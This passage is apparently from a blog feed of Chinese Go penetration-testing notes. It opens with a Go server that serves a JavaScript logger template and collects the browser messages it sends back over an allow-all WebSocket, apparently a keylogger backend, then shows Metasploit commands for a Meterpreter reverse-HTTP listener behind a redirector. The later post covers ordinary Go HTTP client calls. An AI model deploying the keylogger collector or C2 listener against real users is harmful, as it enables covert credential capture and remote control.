class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/websocket&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">upgrader = websocket.Upgrader&#123;</span><br><span class="line">CheckOrigin: <span class="function"><span class="keyword">func</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123; <span class="keyword">return</span> <span class="literal">true</span> &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">listenAddr <span class="type">string</span></span><br><span class="line">wsAddr     <span class="type">string</span></span><br><span class="line">jsTemplate *template.Template</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">flag.StringVar(&amp;listenAddr, <span class="string">&quot;listen-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address to listen on&quot;</span>)</span><br><span class="line">flag.StringVar(&amp;wsAddr, <span class="string">&quot;ws-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address for WebSocket connection&quot;</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">jsTemplate, err = template.ParseFiles(<span class="string">&quot;logger.js&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveWS</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">conn, err := upgrader.Upgrade(w, r, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(w, <span class="string">&quot;&quot;</span>, <span class="number">500</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line">fmt.Printf(<span class="string">&quot;Connection from %s\n&quot;</span>, conn.RemoteAddr().String())</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">_, msg, err := conn.ReadMessage()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;From %s: %s\n&quot;</span>, conn.RemoteAddr().String(), <span class="type">string</span>(msg))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveFile</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/javascript&quot;</span>)</span><br><span class="line">jsTemplate.Execute(w, wsAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/ws&quot;</span>, serveWS)</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/k.js&quot;</span>, serveFile)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要先下载<code>github.com/gorilla/websocket</code>的包</p><p>首先，定义一个<code>websocket.Upgrader</code>，该实例会将每个来源列入白名单，允许所有来源的做法是不安全的，但是，这里，我们选择继续使用，当作测试用例。之后再定义监听地址和 ws地址。以及定义<code>js</code>所使用的模板地址</p><p>然后创建<code>init函数</code>，再main函数之前，自动调用</p><blockquote><p>flag包用来设置参数和解析值：地址，参数，默认值和备注</p><p>然后使用Parse()进行解析</p></blockquote><p>接下来定义了一个 <code>ServeWS</code>的函数，用来处理<code>websocket</code>通信，通过<code>upgrader.Upgrade</code>方法，创建新的<code>websocket,Conn</code>实例。方法<code>Upgrade()</code>升级了HTTP连接以使用<code>websocket</code>协议。这将意味着此函数处理任何请求都将升级为使用<code>websocket</code>，再无限的for循环中进行交互，调用<code>conn.ReadMessage()</code>读取信息，</p><p>然后我们创建一个<code>serveFile()</code>的处理函数，此函数将检索并且返回<code>javascript</code>的模板内容，其中包括上下文数据，为此，我们需要将<code>Content-Type</code>标头，设置为<code>application/javascript</code>，这就告诉连接正文，将与浏览器之间的响应内容视为<code>javascript</code>，</p><p>之后设置解析我们传入的<code>wsAddr</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsTemplate.Execute(w, wsAddr)</span><br></pre></td></tr></table></figure><p>最后我们只要创建路由就可以了。</p><h2 id="0x03-多路命令和控制"><a href="#0x03-多路命令和控制" class="headerlink" title="0x03 多路命令和控制"></a>0x03 多路命令和控制</h2><p>在本节中，我们需要学会 go 创建反向<code>http</code>代理，以便可以基于<code>Host HTTP</code>标头动态路由中传入的<code>Meterpreter</code>会话，这正是虚拟网站托管的方式。</p><p>首先，代理会充当重定向器，允许你仅公开域名和<code>IP</code>地址，而无需公开<code>metasploit</code>监听器，如果重定向器曾被列为黑名单，你可以直接移除他，而不是移除<code>C2</code>服务器。其次，你可以扩展这里的概念来进行域前置，他是利用可信第三方域绕过限制性出口的技术。</p><p>首先，我们需要设置单独的<code>MeterPreter</code>反向HTTP监听器</p><p>大致如下</p><blockquote><p>msf6 &gt; use exploit&#x2F;multi&#x2F;handler<br>[*] Using configured payload generic&#x2F;shell_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter_reverse_http<br>payload &#x3D;&gt; windows&#x2F;meterpreter_reverse_http<br>msf6 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.68.130<br>LHOST &#x3D;&gt; 192.168.68.130<br>msf6 exploit(multi&#x2F;handler) &gt; set LPORT 80<br>LPORT &#x3D;&gt; 80</p><p>msf6 exploit(multi&#x2F;handler) &gt; set ReverseListenerBindAddress 192.168.68.130<br>ReverseListenerBindAddress &#x3D;&gt; 192.168.68.130<br>msf6 exploit(multi&#x2F;handler) &gt; set ReverseListenerBindPort 20080<br>ReverseListenerBindPort &#x3D;&gt; 20080<br>msf6 exploit(multi&#x2F;handler) &gt; exploit -j -z<br>[<em>] Exploit running as background job 0.<br>[</em>] Exploit completed, but no session was created.</p><p>[*] Started HTTP reverse handler on <a href="http://192.168.68.130:20080/">http://192.168.68.130:20080</a></p></blockquote><blockquote><p> exploit -j -z    #handler后台持续监听</p></blockquote><p>然后，我们再以同样的方式,开一个30080端口</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220304125300.png"></p><p>这个没有成功复现，鸽一会</p>]]></content>
    
    
    <summary type="html">HTTP服务器，路由，中间件</summary>
    
    
    
    <category term="Go渗透测试" scheme="https://h0ld1rs.github.io/categories/Go%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Golang,渗透测试" scheme="https://h0ld1rs.github.io/tags/Golang-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(三)</title>
    <link href="https://h0ld1rs.github.io/posts/32502.html"/>
    <id>https://h0ld1rs.github.io/posts/32502.html</id>
    <published>2022-03-01T13:39:42.000Z</published>
    <updated>2022-03-02T03:45:51.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-三-—HTTP客户端与工具的远程交互"><a href="#Go渗透测试笔记-三-—HTTP客户端与工具的远程交互" class="headerlink" title="Go渗透测试笔记(三)—HTTP客户端与工具的远程交互"></a>Go渗透测试笔记(三)—HTTP客户端与工具的远程交互</h1><h2 id="0x00-Go的HTTP基础知识"><a href="#0x00-Go的HTTP基础知识" class="headerlink" title="0x00 Go的HTTP基础知识"></a>0x00 Go的HTTP基础知识</h2><ol><li>HTTP是一种无状态的协议，服务器不会维护每个请求的状态，而是通过多种方式跟踪其状态，这些方式可能包括：<code>会话标识符，cookie，HTTP标头等</code>。客户端和服务器有责任正确协商和验证状态</li><li>其次，客户端和服务器之间的通信可以一部或者同步进行，但他们需要以<code>请求/响应</code>的方式循环运行。可以在请求头中添加几个选项和表标头，以影响服务器的行为并创建可用的Web应用程序。最常见的是服务器托管Web浏览器渲染的文件，以生成数据的图形化，组织化和时尚化的表示形式。API通常使用<code>XML,JSON,MSGRPC</code>进行通信，某些情况下，可能检索到的是二进制格式，表示下载任意文件类型</li></ol><h2 id="0X01-调用HTTP-API"><a href="#0X01-调用HTTP-API" class="headerlink" title="0X01 调用HTTP API"></a>0X01 调用HTTP API</h2><h3 id="1-调用HTTP方法"><a href="#1-调用HTTP方法" class="headerlink" title="1. 调用HTTP方法"></a>1. 调用HTTP方法</h3><p>包使用<code>net/http</code></p><p>这些函数的使用格式如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get(url <span class="type">string</span>)(resp *Response,err <span class="type">error</span>)</span><br><span class="line">Head(url <span class="type">string</span>)(resp * Response,err <span class="type">error</span>)</span><br><span class="line">Post(url <span class="type">string</span>,bodyType <span class="type">string</span>,body io.Reader)(resp *Response.err <span class="type">error</span>)</span><br></pre></td></tr></table></figure><p>每个函数都将URL字符串作为参数并将其用作请求的目的地。Post函数要比较复杂一些，Post()具有两个附加参数(bodyType 和io.Reader)，其中 bodyType()用于接受正文的<code>Content-Type</code>，HTTP标头，(通常为 application&#x2F;x-www-form-urlencoded)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r1,err := http.Get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">if</span> err !=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;无法调用&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> r1.Body.Close()</span><br><span class="line">r2,err := http.Head(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">defer</span> r2.Body.Close()</span><br><span class="line">form := url.Values&#123;&#125;</span><br><span class="line">form.Add(<span class="string">&quot;foo&quot;</span>,<span class="string">&quot;bar&quot;</span>)</span><br><span class="line">r3,err := http.Post(</span><br><span class="line"><span class="string">&quot;http://www.goole.com&quot;</span>,</span><br><span class="line"><span class="string">&quot;application/x-www-form-urlencode&quot;</span>,</span><br><span class="line">strings.NewReader(form.Encode()),</span><br><span class="line">)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">defer</span> r3.Body.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然，Go又一个函数<code>PostForm()</code>可以代替</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r1,err := http.Get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">if</span> err !=<span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;无法调用&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> r1.Body.Close()</span><br><span class="line">r2,err := http.Head(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">defer</span> r2.Body.Close()</span><br><span class="line">form := url.Values&#123;&#125;</span><br><span class="line">form.Add(<span class="string">&quot;foo&quot;</span>,<span class="string">&quot;bar&quot;</span>)</span><br><span class="line">r3,err := http.PostForm(<span class="string">&quot;http://www.baidu,com&quot;</span>,form)</span><br><span class="line"><span class="comment">//读取响应正文，未显示</span></span><br><span class="line"><span class="keyword">defer</span> r3.Body.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其他的HTTP动词，如<code>PATCH,PUT,DELETE</code>，不存在便捷函数，我们主要使用这些动词来与<code>RESTFUL api</code>进行交互</p><h3 id="2-生成一个请求"><a href="#2-生成一个请求" class="headerlink" title="2. 生成一个请求"></a>2. 生成一个请求</h3><p>我们可以使用<code>NewRequest()</code>创建结构体 <code>Request</code>，然后使用Client的<code>Do()发送该结构体</code></p><p>结构如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewRequest</span><span class="params">(method, url <span class="type">string</span>, body io.Reader)</span></span> (*Request, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> NewRequestWithContext(context.Background(), method, url, body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们需要发送一个<code>DELETE</code>的请求，可以</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">req,err := http.NewRequest(<span class="string">&quot;DELETE&quot;</span>,<span class="string">&quot;http://www.baidu.com&quot;</span>,<span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">var</span> client http.Client</span><br><span class="line">resp,err := client.Do(req)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读取响应内容并关闭</span></span><br><span class="line">resp.Body.Close()</span><br><span class="line">fmt.Println(resp.Status)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是一个<code>io.Reader</code>的<code>Put</code>请求</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;net/url&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">form := url.Values&#123;&#125;</span><br><span class="line">form.Add(<span class="string">&quot;foo&quot;</span>,<span class="string">&quot;bar&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> client http.Client</span><br><span class="line">req,err := http.NewRequest(</span><br><span class="line"><span class="string">&quot;PUT&quot;</span>,</span><br><span class="line"><span class="string">&quot;http://www.goole.com&quot;</span>,</span><br><span class="line">strings.NewReader(form.Encode()),</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">resp,err := client.Do(req)</span><br><span class="line">fmt.Println(resp.Status)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-使用结构化进行解析"><a href="#3-使用结构化进行解析" class="headerlink" title="3. 使用结构化进行解析"></a>3. 使用结构化进行解析</h3><p>在发送请求后，我们需要<code>ioutil.ReadAll()</code>获取响应正文读取数据，进行一些错误检查，并将HTTP状态码和响应正文打印到<code>stdout</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">resp,err := http.Get(<span class="string">&quot;https://www.baidu.com/robots.txt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(resp.Status)</span><br><span class="line"><span class="comment">//读取并显示响应正文</span></span><br><span class="line">body,err :=ioutil.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="type">string</span>(body))</span><br><span class="line">resp.Body.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在接收到<code>resp</code>的响应后，可以通过访问可输出的参数<code>Status</code>来检索状态字符串(例如200 OK)，还有一个与此类似的参数<code>StatusCode</code></p><p><code>Response</code>类型。该参数仅存状态字符串的整数部分</p><p><code>Response</code>类型包含一个可输出的参数<code>Body</code>，其类型为<code>io.ReadCloser</code>，<code>ioReadCloser</code>充当<code>io.Reader</code>以及<code>io.Closer</code>的接口，或者需要实现<code>Close()</code>函数以关闭reader并执行任何清理的接口。从<code>io.ReadCloser</code>读取数据后，需要在响应正文上调用<code>Close()</code>函数。使用<code>defer</code>关闭响应正文是一种常见的作法，这样可以保证函数在返回之前将其关闭</p><p>返回内容如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">200 OK</span><br><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Googlebot</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: MSNBot</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Baiduspider-image</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: YoudaoBot</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou web spider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou inst spider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou spider2</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou blog</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou News Spider</span><br><span class="line">Disallow: /baidu</span><br><span class="line">Disallow: /s?</span><br><span class="line">Disallow: /shifen/</span><br><span class="line">Disallow: /homepage/</span><br><span class="line">Disallow: /cpro</span><br><span class="line">Disallow: /ulink?</span><br><span class="line">Disallow: /link?</span><br><span class="line">Disallow: /home/news/data/</span><br><span class="line">Disallow: /bh</span><br><span class="line"></span><br><span class="line">User-agent: Sogou Orion spider</span><br><span 